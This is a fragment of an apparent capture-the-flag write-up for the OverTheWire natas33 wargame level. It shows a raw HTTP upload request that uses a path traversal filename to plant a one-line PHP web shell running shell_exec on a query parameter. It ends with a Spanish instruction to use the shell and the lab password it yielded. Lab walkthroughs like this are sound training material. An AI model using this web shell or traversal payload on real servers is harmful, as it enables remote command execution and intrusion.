User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://natas33.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6
Connection: close

——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”MAX_FILE_SIZE”

4096
——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”filename”

../../var/www/natas/natas33-new/index.php
——WebKitFormBoundaryrDg9m1cnIOTLcDtc
Content-Disposition: form-data; name=”uploadedfile”; filename=”abcd”
Content-Type: application/octet-stream

<?php echo shell_exec($_GET[‘c’]); ?>
——WebKitFormBoundaryrDg9m1cnIOTLcDtc–
~~~
Utilice el webshell cargado para obtener la contraseña:
shu5ouSu6eicielahhae0mohd4ui5uig